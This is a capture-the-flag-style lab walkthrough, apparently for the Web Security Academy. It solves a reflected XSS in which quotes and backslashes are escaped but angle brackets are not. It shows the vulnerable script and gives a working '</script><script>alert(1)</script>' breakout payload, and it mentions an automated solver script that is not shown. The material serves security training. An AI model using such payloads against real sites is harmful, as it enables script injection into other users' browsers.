# XSS LAB 18 - Reflected XSS into a JavaScript string with single quote and backslash escaped

## Manual Solution

### 1. Access the Lab.
- Open the Web Security Academy lab environment in your browser.

### 2. Analyze the Vulnerability
- Perform a search with the following query: ` ' " / \ < > `
- Open the inspect and locate the script.
```js
<script>
    var searchTerms = ' \' " / \\ < > ';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```
- We can see that the backslash  and single quote (') are escaped but the less-than (<) and greater-than (>) are not encoded.

### 3. Inject the XSS payload
- Perform a search with the following query: `</script> abc`
- The script turns into this: 
```js
<script> var searchTerms = '</script>
 abc'; document.write('
```
- As you can see we closed the script tags allowing us to inject an XSS payload.
- Perform a search with the following query: `</script><script>alert(1)</script>`
- An alert pop-up appears.

## Automated Solution

### 1. Download the script
### 2. Run the script with the following command:
```sh
python xss_lab_18.py -u <target_url> -p (if you want to use proxy 127.0.0.1:8080)
```